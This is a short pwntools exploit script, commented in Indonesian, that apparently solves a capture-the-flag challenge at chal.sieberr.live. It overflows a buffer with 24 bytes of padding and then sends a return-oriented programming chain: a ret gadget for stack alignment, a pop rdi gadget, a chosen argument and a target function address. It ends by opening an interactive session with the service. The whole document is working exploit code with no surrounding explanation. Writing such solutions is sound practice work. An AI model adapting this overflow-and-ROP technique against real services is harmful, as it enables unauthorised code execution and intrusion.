from pwn import *

p = remote('chal.sieberr.live', 21001)
# p = process('./owo')

# Alamat presisi dari hasil objdump
pop_rdi_ret = 0x0040119e 
ret_gadget = 0x0040119f   # Digunakan untuk Stack Alignment 16-byte
target_func = 0x004011a3
argument_sus = 67416741

# ROP Chain yang sudah diperbaiki alignment-nya
payload = b"A" * 24
payload += p64(ret_gadget)   # <--- Penyelamat dari MOVAPS crash
payload += p64(pop_rdi_ret)
payload += p64(argument_sus)
payload += p64(target_func)

log.info("Mengirimkan ROP Chain dengan Stack Alignment Fix...")
p.sendlineafter(b">>> ", payload)
p.interactive()
